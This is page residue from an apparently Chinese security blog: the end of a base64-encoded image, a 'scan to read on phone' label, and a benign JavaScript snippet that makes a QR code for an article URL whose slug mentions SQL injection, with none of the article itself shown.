QH2Y0B9HhC7snF1d7UTcH6SlfYa/r3DpIPwiqb/F6hWxP4w2udwNxuiJkmp1DdL8HCDfXEeKb72gekpOfzVW+Z1ccco+V33WY8zBz8xAdgl2vPW6X/lbbDcTQha85gd27LJin6/TcnlyE5OXmIDoE9WHm6tZ17D7M9dt8z269uobU1nUtOOa9T+dV+ycLju+37XW9Qran8QbXu3dZq6cBMl2YcfU99D6QupW+6qPe69S3CLmHmjXP0PwKIX0huMqd1WHuA+HA9Un99mZfuz+y4GtawNhuf8o01IH7p2N1mLk5fVEd5jyEw4zmrX+EMNeahehye4oQX97ROhGO8zDr5jtu++8G0sMX/9kTGO+y+m2dWtfheOqr/Kq+6yve+0LuD3s828OeMPewXv92iwLHubhf/4bjHET/Suaq36fU6xVSp/BGa7zLclriao/dh/PTr57Ww1ynXpntguS6Lz/Cbf3RNaTnkVcazP7RPUqr7HaVdrS2me01zPcp73qF1Cm80Ro/QyDTgnPYvwdInTqE+8Soi12HOa8vWtcRUgd0a8nt2XFZ0Azg/o7S+mbfPaDLO249MGquV8jumF4rjIE4rWfYt9vz+upy+HoKAOWBPa8BjKcHUB5oXeEQ2wVw79HkuwYMGbhrQ/i8gFmve9X6tHdQXq2d8SmUV+uTjr+LXNoYiOaFrz2B3UAgTwPMuNomnMvV9GvZB1LXOcy6ftXWkkNysEczla8lhzmr3rFqakHy3YfoENSHcJhRv3rWkkNy8sLdQEq81utO4K8NpCZfy28FMn0IqneEYx+iV89aMPPSVqvfY8Wt15dD7qUuwqyb119xdUg9BI/0vzYQN3Xh907g2wPpU+7b6b58hb1ebh7ydMEae1Yu2rMjpKe6+RWaWyGkHwTN2U++xW8PZNvsuv7+CewG4vQ6/u6trLdODvPTAuEQNCda31H/CHv2GYfc+2wO5rx7WNXri5B6CG7rdgPZmtf1z5/AGAhkWvAYV1vs01/l1CH3ka/q4ThnHcQHlO6ftuHr/yIDuGsGvJf8GULqrRN7HSSn3nMQX100XzgGUuRarz+BayCvn8G0g/8BAAD//zRxzvwAAAAGSURBVAMAzC0ZsOoN9fcAAAAASUVORK5CYII=)

手机扫码阅读

计算机服务器


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/windor-Module-BPCJ-AD\_Tag-Controller-ADTag-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 